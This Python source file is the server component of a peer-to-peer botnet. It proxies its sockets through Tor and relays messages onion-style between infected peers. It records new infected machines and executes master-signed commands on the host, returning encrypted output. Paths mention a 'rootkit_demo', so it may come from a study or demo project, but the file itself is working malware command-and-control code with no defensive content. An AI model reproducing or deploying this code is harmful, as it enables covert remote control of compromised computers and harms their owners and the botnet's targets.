"""Server side of the p2p communication protocol"""

import logging
import threading
import copy
import socket
import socks

from botnet_p2p import ENCODING, BUFFER_SIZE
from botnet_p2p.operations import (
    add_new_infected_machine,
    execute_command,
    select_random_neighbour,
)
from botnet_p2p.message import breakdown_msg, signed_by_master, structure_msg
from botnet_p2p.security import encrypt

logging.basicConfig(level=logging.INFO)


NEW_NODE = 0
UPDATE_PEER_LIST = 1
COMMAND = 2
UPDATE_FILE = 4

SERVER_HOST = "localhost"
SERVER_PORT = 50000
TOR_SERVER_PORT = 50001
MAX_QUEUE = 4

public_key_path = "/etc/rootkit_demo/public/source/public_key"
private_key_path = "/etc/rootkit_demo/private_key"

socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050, True)
socket.socket = socks.socksocket


def start_server():
    logging.info("Starting server ...")
    server_socket = socket.socket()
    server_socket.bind((SERVER_HOST, SERVER_PORT))
    server_socket.listen(MAX_QUEUE)

    while True:
        client_socket, addr = server_socket.accept()
        client_thread = threading.Thread(target=talk_with_client, args=(client_socket,))
        client_thread.start()


def talk_with_client(client_socket: socket.socket) -> None:
    """ Keep the connection alive with the client and exchange
        messages

        Args:
            client_socket: Socket used to talk with the client
    """
    logging.info("Receiving new message ...")
    coded_msg = client_socket.recv(BUFFER_SIZE)
    msg_info = breakdown_msg(coded_msg)

    num_anonymizers = msg_info["num_anonymizers"]
    onion = msg_info["onion"]
    msg_type = msg_info["msg_type"]
    msg = msg_info["msg"]
    sign = msg_info["sign"]

    if num_anonymizers < 0:
        client_socket.close()
    elif num_anonymizers != 0:
        if num_anonymizers == 1:
            next_hop = onion
        else:
            next_hop = select_random_neighbour()

        updated_msg_info = update_num_anonymizers(msg_info)
        neighbour_node = socket.socket()
        neighbour_node.connect((next_hop, TOR_SERVER_PORT))
        forward(neighbour_node, updated_msg_info)
        send_back(client_socket, neighbour_node)
    else:
        if not msg_requires_to_be_signed(msg_type):
            add_new_infected_machine(msg)
        else:
            if signed_by_master(coded_msg, public_key_path):
                logging.info("The message was signed by the master")
                if msg_type == COMMAND:
                    output = execute_command(msg)
                    encrypted_msg = encrypt(output, public_key_path)
                    client_socket.send(encrypted_msg)
            else:
                logging.info("Someone is trying to break in")


def update_num_anonymizers(msg_info: dict) -> dict:
    msg_info_copy = copy.deepcopy(msg_info)
    msg_info_copy["num_anonymizers"] -= 1

    return msg_info_copy


def forward(next_hop: socket.socket, msg_info: dict):
    updated_msg = structure_msg(msg_info)
    next_hop.send(updated_msg)


def send_back(to: socket.socket, from_: socket.socket):
    response = from_.recv(BUFFER_SIZE)
    from_.close()
    to.send(response)
    to.close()


def msg_requires_to_be_signed(msg_type: int) -> bool:
    return msg_type != NEW_NODE


start_server()
